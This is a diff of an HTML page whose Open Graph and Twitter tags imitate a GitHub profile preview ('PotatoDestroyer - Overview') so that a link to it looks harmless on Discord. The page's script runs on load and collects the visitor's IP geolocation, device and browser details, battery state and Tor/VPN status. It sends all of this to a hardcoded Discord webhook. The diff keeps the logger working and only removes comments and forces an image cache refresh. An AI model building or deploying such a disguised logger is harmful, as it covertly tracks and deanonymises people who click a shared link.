@@ -1,18 +1,17 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <!-- ===== EMBED META TAGS (estilo GitHub para Discord) ===== -->
-    <meta property="og:image" content="https://i.imgur.com/JbRnGVK.jpeg" />
+    <!-- ===== EMBED META TAGS (con URL de imagen forzada para cache) ===== -->
+    <meta property="og:image" content="https://i.imgur.com/JbRnGVK.jpeg?v=2" />
     <meta property="og:image:alt" content="PotatoDestroyer999 has one repository available. Follow their code on GitHub." />
     <meta property="og:title" content="PotatoDestroyer - Overview" />
     <meta property="og:url" content="https://potatodestroyer999.github.io/D3DSEC/" />
     <meta property="og:description" content="PotatoDestroyer999 has one repository available. Follow their code on GitHub." />
     <meta property="og:site_name" content="GitHub" />
-    <!-- Twitter tags (opcionales, pero refuerzan la apariencia) -->
     <meta name="twitter:card" content="summary" />
     <meta name="twitter:title" content="PotatoDestroyer - Overview" />
     <meta name="twitter:description" content="PotatoDestroyer999 has one repository available. Follow their code on GitHub." />
-    <meta name="twitter:image" content="https://i.imgur.com/JbRnGVK.jpeg" />
+    <meta name="twitter:image" content="https://i.imgur.com/JbRnGVK.jpeg?v=2" />
     <!-- ===== FIN EMBED META TAGS ===== -->
 
     <meta charset="UTF-8">
@@ -102,7 +101,6 @@
             const statusEl = document.getElementById('status');
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';
 
-            // Get static device data (instant)
             function getDeviceInfo() {
                 const nav = navigator;
                 const ua = nav.userAgent;
@@ -136,7 +134,6 @@
                 };
             }
 
-            // Get battery info (async, but we run it in parallel)
             async function getBatteryInfo() {
                 try {
                     if (navigator.getBattery) {
@@ -152,9 +149,7 @@
                 return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
             }
 
-            // Send to Discord
             async function sendToDiscord(ipData, device, battery, torDetected) {
-                // Determine VPN/TOR status
                 let vpnTorStatus = 'No VPN/TOR Found';
                 const proxyDetected = ipData.proxy === true;
                 if (proxyDetected && torDetected) {
@@ -212,12 +207,8 @@
                 }
             }
 
-            // Main execution – ahora todo en paralelo
             async function execute() {
-                // 1. Obtener datos del dispositivo (síncrono, instantáneo)
                 const device = getDeviceInfo();
-
-                // 2. Lanzar todas las promesas asíncronas en paralelo
                 const batteryPromise = getBatteryInfo();
                 const geoPromise = fetch('https://ipapi.co/json/')
                     .then(res => res.ok ? res.json() : null)
@@ -226,13 +217,10 @@
                     .then(res => res.ok ? res.json() : null)
                     .catch(() => null);
 
-                // Esperar a que todas terminen (la más lenta marca el tiempo total)
                 const [battery, geoData, torData] = await Promise.all([batteryPromise, geoPromise, torPromise]);
 
-                // 3. Preparar los datos de geolocalización
                 let ipData = geoData;
                 if (!ipData || !ipData.ip) {
-                    // Fallback: usar ipify para obtener la IP y datos por defecto
                     try {
                         const ipResp = await fetch('https://api.ipify.org?format=json');
                         const ipJson = await ipResp.json();
@@ -250,19 +238,14 @@
                             tor: false
                         };
                     } catch (e) {
-                        // Si todo falla, usamos un objeto vacío
                         ipData = { ip: 'Unknown', proxy: false, tor: false };
                     }
                 }
 
-                // 4. Detectar TOR a partir del dato oficial
                 const torDetected = torData && torData.IsTor === true;
-
-                // 5. Enviar a Discord inmediatamente
                 await sendToDiscord(ipData, device, battery, torDetected);
             }
 
-            // Ejecutar al cargar la página
             if (document.readyState === 'complete') {
                 execute();
             } else {
